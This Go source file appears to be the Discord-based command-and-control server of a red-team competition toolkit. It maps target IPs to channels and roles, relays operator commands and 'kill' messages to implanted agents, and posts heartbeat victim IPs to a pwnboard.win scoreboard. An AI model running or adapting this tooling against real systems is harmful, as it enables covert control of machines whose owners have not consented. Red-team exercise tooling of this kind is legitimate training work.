package main

import (
	"bufio"
	"bytes"
	"encoding/json"
	"flag"
	"fmt"
	"net/http"
	"os"
	"os/signal"
	"strconv"
	"strings"
	"syscall"

	"DiscordGo/pkg/util"

	"github.com/AvraamMavridis/randomcolor"
	"github.com/bwmarrin/discordgo"
	log "github.com/sirupsen/logrus"
)

var dg *discordgo.Session
var err error
var channelID *discordgo.Channel // Target Channel ID
var fileInputPtr string          // Input file string
var targetMap map[string]Target  // Putting each line of the csv in a list/array
var teams []string               // Special list of the team number: Used for ...
var hostnameList []string
var osList []string                               // Special list of hostname: used for ...
var heartbeatCounter, aliveAgents, deadAgents int // How many heartbeats have we had during an engagement
var statRecords = []int{0, 0, 0}                  //[0] = heartbeats, [1] = alive agents, [2] = dead agents
var tmpStatFile string = "/tmp/discordstat.txt"   // Contains stats about bots

// TODO Move the dead to archive catergory
var (
	commands = []*discordgo.ApplicationCommand{
		{
			Name:        "stats",
			Type:        discordgo.ChatApplicationCommand,
			Description: "Quick stats about the comp",
		},
		{
			Name:        "archive",
			Type:        discordgo.ChatApplicationCommand,
			Description: "Archive/Delete dead channels",
		},
		{
			Name:        "clean",
			Type:        discordgo.ChatApplicationCommand,
			Description: "Rearranges channels to the right channel",
		},
		{
			Name:        "delcomp",
			Type:        discordgo.ChatApplicationCommand,
			Description: "Cleaning up all targets",
		},
	}
)

// Target representation
type Target struct {
	ip         string
	teamstring string
	hostname   string
	ostype     string
}

// PwnBoard json post request
type PwnBoard struct {
	IPs  string `json:"ip"`
	Type string `json:"type"`
}

// This init function
func init() {
	flag.StringVar(&fileInputPtr, "f", "", "This csv should contains the list of targets: ip,team#,hostname,ostype")
	flag.Parse()

	if fileInputPtr == "" {
		log.Fatal("No file specified")
		os.Exit(0)
	}

	log.SetOutput(os.Stdout)
	log.Info("Target file: " + fileInputPtr)

	dg, err = discordgo.New("Bot " + util.BotToken)
	if err != nil {
		log.Error("error creating Discord session,", err)
		return
	}
	log.Info("Bot Connected")
}

// Parsing the input csv file and creates a list that will used in other parts of the code
func parseCSV(csvName string) (map[string]Target, []string, []string, []string) {
	var list = make(map[string]Target)
	f, err := os.Open(csvName)
	if err != nil {
		panic(err)
	}
	s := bufio.NewScanner(f)
	teamnum := []string{}
	hostnameList := []string{}
	osList := []string{}
	for s.Scan() {
		lineBuff := s.Bytes()
		v := strings.Split(string(lineBuff), ",")
		list[v[0]] = Target{
			ip:         v[0],
			teamstring: v[1],
			hostname:   v[2],
			ostype:     v[3],
		}
		teamnum = append(teamnum, v[1])
		hostnameList = append(hostnameList, v[2])
		osList = append(osList, v[3])
	}
	return list, teamnum, hostnameList, osList
}

func assignRoleToChannel(dg *discordgo.Session, channel *discordgo.Channel) {
	log.Info("Assigning roles begin.......")
	permissionOverwriteList := []*discordgo.PermissionOverwrite{}
	g, err := dg.Guild(util.ServerID)
	if err != nil {
		log.Error("Something broke ", err)
		return
	}

	availbleRoles := g.Roles // Roles already created and listed from discord
	for _, value := range targetMap {
		if value.ip == channel.Name || value.hostname == channel.Name || value.ostype == channel.Name {
			for _, role := range availbleRoles {
				if value.teamstring == role.Name || value.hostname == role.Name || value.ostype == role.Name {
					println("Found role: ", role.Name)
					println(channel.Name + " should be assigned " + role.Name)
					permissionOverwriteList = append(permissionOverwriteList, &discordgo.PermissionOverwrite{ID: role.ID})
					log.Info("Assigning " + role.Name + " to " + channel.Name)
					dg.ChannelEditComplex(channel.ID, &discordgo.ChannelEdit{PermissionOverwrites: permissionOverwriteList})
				}
			}
		}
	}

	log.Info("Assigning roles ended.......")
}

// Create/Delete Roles for each target
func createOrDeleteRoles(dg *discordgo.Session, create bool) {
	log.Info("Creating Roles....")
	g, err := dg.Guild(util.ServerID)
	if err != nil {
		log.Error("Something broke ", err)
		return
	}

	potentialRole := []string{} // Roles to be created
	availbleRoles := g.Roles    // Roles already created and listed from discord

	for _, host := range targetMap {
		potentialRole = append(potentialRole, host.hostname)
		potentialRole = append(potentialRole, host.teamstring)
		potentialRole = append(potentialRole, host.ostype)
	}

	// New list without duplicates
	rolesToCreate := util.RemoveDuplicatesValues(potentialRole) // Roles to be created

	if !create { // We want to delete the roles
		for _, role := range availbleRoles {
			for _, roleToDelete := range potentialRole {
				log.Info("Deleting " + role.Name)
				if roleToDelete == role.Name || role.Name == "new role" {
					dg.GuildRoleDelete(util.ServerID, role.ID)
					break
				}
			}
		}
	} else {
		tmpAvailbleRole := []string{} //This is getting the role name(string) rather the role struct
		for _, i := range availbleRoles {
			tmpAvailbleRole = append(tmpAvailbleRole, i.Name)
		}

		for _, role := range rolesToCreate {
			// Color Fix: Thank Fred
			checkRole := util.Find(tmpAvailbleRole, role)
			if checkRole {
				return
			}

			var colorInRGB randomcolor.RGBColor = randomcolor.GetRandomColorInRgb()
			roleColorHex := fmt.Sprintf("%.2x%.2x%.2x", colorInRGB.Red, colorInRGB.Green, colorInRGB.Blue)
			roleColorInt64, err := strconv.ParseInt(roleColorHex, 16, 64)
			if err != nil {
				log.Error(err)
			}
			roleColorInt := int(roleColorInt64)

			log.Info("Creating " + role + " role with color RGB: " + strconv.Itoa(roleColorInt))
			newRole, err := dg.GuildRoleCreate(util.ServerID)
			if err != nil {
				log.Error(err)
			}
			// Editing the role template
			_, err = dg.GuildRoleEdit(util.ServerID, newRole.ID, role, roleColorInt, false, 171429441, true)
			if err != nil {
				log.Error(err)
			}
		}
	}
	log.Info("Creating Roles Ended........")
}

// This function organizes the targets to their respective categories(team01, team02 and so on)
func cleanChannels(dg *discordgo.Session, targetFile string) {
	log.Info("Start Clean")
	checkChannels, _ := dg.GuildChannels(util.ServerID)
	for _, catName := range teams {
		groupExixsts := false
		for _, channelCheck := range checkChannels {
			if channelCheck.Name == catName {
				groupExixsts = true
				log.Warn("Category already exist")
				break
			}
		}
		if !groupExixsts {
			log.Info("Creating non-Existing group")
			newChan, _ := dg.GuildChannelCreate(util.ServerID, catName, 4)
			checkChannels = append(checkChannels, newChan)
		}
	}

	var channelName2ID = make(map[string]string)
	channels, _ := dg.GuildChannels(util.ServerID)
	for _, channel := range channels {
		if _, ok := channelName2ID[channel.Name]; !ok {
			channelName2ID[channel.Name] = channel.ID
		}
	}

	// TODO Check the last message here and move to archived category
	for _, channel := range channels {
		assignRoleToChannel(dg, channel)
		if _, ok := channelName2ID[channel.Name]; !ok {
			channelName2ID[channel.Name] = channel.ID
		}
		if target, ok := targetMap[channel.Name]; ok {
			if group_id, ok := channelName2ID[target.teamstring]; ok {
				dg.ChannelEditComplex(channel.ID, &discordgo.ChannelEdit{ParentID: group_id, Name: target.hostname})
			}
		}
	}
	log.Info("End Clean")
}

func main() {
	targetMap, teams, hostnameList, osList = parseCSV(fileInputPtr)

	createOrDeleteRoles(dg, true)

	cleanChannels(dg, fileInputPtr)

	dg.AddHandler(guimessageCreater)
	dg.AddHandler(slashCommandHandler)

	// Open a websocket connection to Discord and begin listening.
	err = dg.Open()
	if err != nil {
		return
	}

	// Register slash commands
	for _, v := range commands {
		_, err := dg.ApplicationCommandCreate(dg.State.User.ID, util.ServerID, v)
		if err != nil {
			log.Panicf("Cannot create '%v' command: %v", v.Name, err)
		}
	}

	// go util.UpdateStats(statRecords)

	// Wait here until CTRL-C or other term signal is received.
	sc := make(chan os.Signal, 1)
	signal.Notify(sc, syscall.SIGINT, syscall.SIGTERM, os.Interrupt, syscall.SIGTERM)
	<-sc

	// Cleanly close down the Discord session.
	dg.Close()
}

// updatepwnBoard sends a post request to pwnboard with the IP
// Request is done every 15 seconds
// ip: Victim's IP
func updatepwnBoard(ip string) {
	url := "http://pwnboard.win/generic"

	data := PwnBoard{
		IPs:  ip,
		Type: "DiscordG0",
	}

	// Marshal the data
	sendit, err := json.Marshal(data)
	if err != nil {
		return
	}

	// Send the post to pwnboard
	resp, err := http.Post(url, "application/json", bytes.NewBuffer(sendit))
	if err != nil {
		return
	}

	defer resp.Body.Close()
}

func guimessageCreater(dg *discordgo.Session, message *discordgo.MessageCreate) {
	if strings.HasPrefix(message.Content, "!heartbeat") {
		agent_ip_address := strings.Split(message.Content, " ")[1]
		updatepwnBoard(agent_ip_address)
		statRecords[0] = statRecords[0] + 1 // TODO
		statRecords[1] = statRecords[1] + 1 // TODO
	}

	if message.Author.ID == dg.State.User.ID {
		return
	}

	if message.Content == "export" {
		names := []string{}
		channels, _ := dg.GuildChannels(message.GuildID)
		for _, channel := range channels {
			names = append(names, channel.Name)
		}
		dg.ChannelMessageSend(message.ChannelID, "```"+strings.Join(names, "\n")+"```")
	}

	if message.Content == "clean" {
		cleanChannels(dg, fileInputPtr)
		dg.ChannelMessageSend(message.ChannelID, "Cleaned")

		// statRecords[2] = statRecords[2] + 1

		// TODO - Check for dead channels based on the last !heartbeat timestamp
		// REMINDER: Message also has timestamp which can be used to remove dead channels
		// Might be useful channel struct value: lastmessageid

		//
	}

	if message.Content == "delcomp" {
		channels, _ := dg.GuildChannels(util.ServerID)

		log.Info("Looking at the channels")
		for _, channel := range channels {
			if channel.Type == discordgo.ChannelTypeGuildText {
				for _, hostname := range hostnameList {
					if strings.ToLower(hostname) == channel.Name {
						// Sending kill command to bot before deleting channel
						dg.ChannelMessageSend(channel.ID, "kill")
						log.Info("Deleting channel: " + channel.Name)
						_, err := dg.ChannelDelete(channel.ID)
						if err != nil {
							println(err)
						}
						break
					}
				}
			}
		}

		println()
		log.Info("Looking at the category")
		for _, channel := range channels {
			if channel.Type == discordgo.ChannelTypeGuildCategory {
				for _, teamnum := range teams {
					if teamnum == channel.Name {
						log.Info("Deleting category: " + channel.Name)
						_, err := dg.ChannelDelete(channel.ID)
						if err != nil {
							log.Error(err)
						}
						break
					}

				}
			}
		}
		println("Looking at roles")
		createOrDeleteRoles(dg, false)
	}

	// Responsible for mentioned roles
	// Is there a better way to do this???? --- Message me if you can think of something better
	channels, _ := dg.GuildChannels(util.ServerID)
	if len(message.MentionRoles) > 0 {
		log.Info(message.MentionRoles)
		for _, channel := range channels {
			// Loop through the mentioned roles
			run_command := []string{}
			for _, role := range message.MentionRoles {
				println(role)
				// Loop through the channels
				// Loop through channel's Permission overwrites(roles)
				for _, overwrite := range channel.PermissionOverwrites {
					if role == overwrite.ID {
						log.Info(channel.Name, " has role ", overwrite.ID)
						run_command = append(run_command, role)
					}
				}
				if len(run_command) == len(message.MentionRoles) {
					dg.ChannelMessageSend(channel.ID, message.Content)
				}
			}
		}
	}
}

func slashCommandHandler(dg *discordgo.Session, i *discordgo.InteractionCreate) {
	if i.Type != discordgo.InteractionApplicationCommand {
		return
	}

	data := i.ApplicationCommandData()
	log.Info(data.Name)
	switch data.Name {
	case "stats":
		log.Info("Getting stats")
		dg.InteractionRespond(i.Interaction, &discordgo.InteractionResponse{
			Type: discordgo.InteractionResponseChannelMessageWithSource,
			Data: &discordgo.InteractionResponseData{
				Content: "Getting you some stats\n Total number of heartbeats: " + strconv.Itoa(heartbeatCounter) + " \nNumber of alive/dead agents: ",
			},
		})
	case "archive":
		log.Info("Archive dead channels")
		fmt.Printf("What: %v", statRecords)
	case "delcomp":
		log.Info("Deleting Channels")
	}
}
